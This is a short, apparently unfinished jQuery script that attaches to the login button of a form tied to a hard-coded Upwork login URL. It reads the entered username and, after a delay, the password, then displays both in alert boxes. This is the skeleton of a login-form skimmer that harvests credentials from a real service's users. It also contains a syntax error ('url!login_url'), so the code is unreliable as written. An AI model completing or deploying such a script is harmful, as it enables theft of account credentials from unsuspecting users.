


// // find the fiends in your login form






$(".text-capitalize").click(function(){
  
	login_name=$('#login_username').val();  
   	if (login_name === 'NULL' ||  login_name === '' || login_name === null) 
   			{
   				
   			}

   	else	
   			{

   					login_url='https://www.upwork.com/ab/account-security/login'
   				
   					setTimeout(function()
   					{

   						var url  = window.location.href;     // Returns full URL
   				
   						var password_visible=$('#login_password').is(":visible"); 

   						if (password_visible === true)
   								
   								{
   									
   									$(".text-capitalize").click(function(){

   										var password=$('#login_password').val();
   										
   										var url  = window.location.href; 

   										if (url!login_url)
   													{

   														alert(login_name)
   														alert(password)


   													}

   									})
   									

   								}	
   						
   
					}, 3000);


   				
   				


   			}

  
  });


// hidden-xs width-sm btn btn-primary m-0 text-capitalize
// hidden-xs width-sm btn btn-primary m-0 text-capitalize